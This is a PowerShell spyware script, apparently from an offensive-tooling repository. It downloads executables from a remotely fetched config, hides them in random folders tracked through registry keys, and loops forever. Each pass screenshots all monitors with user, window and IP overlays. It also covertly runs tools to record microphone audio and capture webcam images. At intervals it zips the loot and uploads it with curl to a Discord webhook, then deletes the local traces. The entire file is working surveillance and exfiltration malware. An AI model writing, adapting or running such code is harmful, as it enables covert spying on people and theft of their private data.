param(
    [bool]$instant=$false
)

$Webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
$BaseDir = "$env:TEMP\$env:COMPUTERNAME`_$env:USERNAME`_data"
$Counter = 0

if(-not(Test-Path -Path $BaseDir -PathType Container)) { 
    New-Item -Path $BaseDir -ItemType Directory -Force | Out-Null 
}

function Get-Config{
    try{
        return (iwr -uri https://github.com/Soumyo001/offensive_powershell/raw/refs/heads/main/assets/config.json -UseBasicParsing).Content | ConvertFrom-Json
    }catch{ return $null }
}

function Get-Paths {
    param($dropPaths)
    return $dropPaths | % { 
        $t = iex "$_"
        try{
            if(-not(Test-Path -Path "$t" -PathType Container)){
                New-Item -Path "$t" -ItemType Directory -Force -ErrorAction SilentlyContinue
            }
            $t
        } catch { } 
    } | ? { if($null -ne $_) { Test-Path -Path "$_" -PathType Container } }
}

function Deploy-Tool {
    param($toolConfig, $dropPaths)
    
    $regPath = "HKCU:\$($toolConfig.regkey)"
    $valName = $toolConfig.valuename
    
    # 1. Try to recover from registry first
    $item = Get-ItemProperty -Path $regPath -Name $valName -ErrorAction SilentlyContinue
    if($item -and (Test-Path -Path $item.$valName -PathType Leaf)) {
        return $item.$valName
    }
    
    # 2. Otherwise: download to random safe dir
    $targetDir = $dropPaths | Get-Random
    $randomName = "$([System.IO.Path]::GetRandomFileName()).exe"
    $finalPath = Join-Path -Path $targetDir -ChildPath $randomName
    
    try {
        iwr -Uri $toolConfig.url -OutFile $finalPath -UseBasicParsing
        if(-not (Test-Path -Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
        Set-ItemProperty -Path $regPath -Name $valName -Value $finalPath -Type String -Force # TODO: Set Out-Null
        return $finalPath
    } catch {}
    return $null
}

$config = Get-Config
if(-not $config) {exit}

$dropPaths = Get-Paths -dropPaths $config.safe_dirs
$mic_path = Deploy-Tool -toolConfig $config.mic -dropPaths $dropPaths
$cam_path = Deploy-Tool -toolConfig $config.cam -dropPaths $dropPaths

try {
    $ip = (Invoke-RestMethod -Uri "https://ifconfig.me/ip" -TimeoutSec 3 -ErrorAction SilentlyContinue)
} catch { }

while ($true) {
    $time = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
    $activeWindow = (Get-Process | Where-Object {$_.MainWindowTitle} | Sort-Object CPU -Descending | Select-Object -First 1).MainWindowTitle
    $foregroundProc = (Get-Process | Where-Object {$_.Id -eq (Get-Process -Id (Get-NetTCPConnection -State Established | Where-Object {$_.OwningProcess} | Select-Object -First 1).OwningProcess)}).Name
    
    if(-not(Test-Path -Path $BaseDir -PathType Container)) { 
        New-Item -Path $BaseDir -ItemType Directory -Force | Out-Null 
    }

    Add-Type -AssemblyName System.Windows.Forms,System.Drawing 

    foreach ($screen in [Windows.Forms.Screen]::AllScreens) {
        $bounds = $screen.Bounds
        try {
            $bmp      = New-Object System.Drawing.Bitmap ([int]$bounds.Width), ([int]$bounds.Height) 
            $graphics = [System.Drawing.Graphics]::FromImage($bmp) 
            $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.Size) 
            $overlay = "$env:USERNAME@$env:COMPUTERNAME | $time | Window: '$activeWindow' | Proc: $foregroundProc"

            if($ip) { $overlay += " | $ip" }

            $font = New-Object System.Drawing.Font("Consolas", 14, [System.Drawing.FontStyle]::Bold)
            $brush = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::Red)
            $graphics.DrawString($overlay, $font, $brush, 10, 10)
        
            $file = "$BaseDir\screen_$time`_monitor$($screen.DeviceName.Split('\')[-1]).png"
            $bmp.Save($file, [System.Drawing.Imaging.ImageFormat]::Png)
        }
        finally {
            $graphics.Dispose() 
            $bmp.Dispose() 
        }
    }

    if (-not ($dropPaths -is [array] -and $null -ne $dropPaths -and $dropPaths.Count -gt 0)){
        $dropPaths = Get-Paths
    }

    if( $Counter % 12 -eq 0 -or $instant ) { # either mod with 12(3 min interval) or 20 (5 minute interval)
        if( -not( Test-Path -Path "$mic_path" -PathType Leaf ) ){
            $mic_path = Deploy-Tool -toolConfig $config.mic -dropPaths $dropPaths
            Write-Output "mic path: $mic_path"
        }
        if( -not( Test-Path -Path "$cam_path" -PathType Leaf ) ){
            $cam_path = Deploy-Tool -toolConfig $config.cam -dropPaths $dropPaths
            Write-Output "cam path: $cam_path"
        }
        $micParam = @("-o", "$BaseDir\mic_$env:USERNAME.wav", "-d", "10")
        $camParam = @("-o", "$BaseDir\cam_$env:USERNAME.jpg")
        
        Get-Process | ? {$_.Path -eq "$mic_path" -or $_.Path -eq "$cam_path"} | % {
            try { $_.Kill(); } catch {}
        }

        # write-output "Before Start-Process $(Get-Date)"
        $micProc = Start-Process $mic_path -WindowStyle Hidden -ArgumentList $micParam -PassThru
        $camProc = Start-Process $cam_path -WindowStyle Hidden -ArgumentList $camParam -PassThru
        # write-output "After Start-Process $(Get-Date)"
    }

    if( $Counter -gt 0 -and $Counter % 240 -eq 0 ) {
        if($null -ne $micProc -and -not($micProc.HasExited)) {
            $micDone = $micProc.WaitForExit(10000)
            if(-not($micDone)){
                $micProc.Kill()
            }
        }
        if($null -ne $camProc -and -not($camProc.HasExited)) { 
            $camDone = $camProc.WaitForExit(1000)
            if(-not($camDone)){
                $camProc.Kill()
            }
         }
        
        $zip = "$env:TEMP\$env:COMPUTERNAME`_$env:USERNAME`_$(Get-Date -f 'yyyy_MM_dd_HH_mm_ss').zip"
        Compress-Archive -Path "$BaseDir\*" -DestinationPath $zip -Force
        curl.exe -F "file=@$zip" $Webhook
        Remove-Item "$BaseDir\*" -Force -Recurse
        Remove-Item $zip -Force
        $Counter = 0
        $micProc = $null
        $camProc = $null
    }
    $Counter++
    Start-Sleep -Seconds 15
}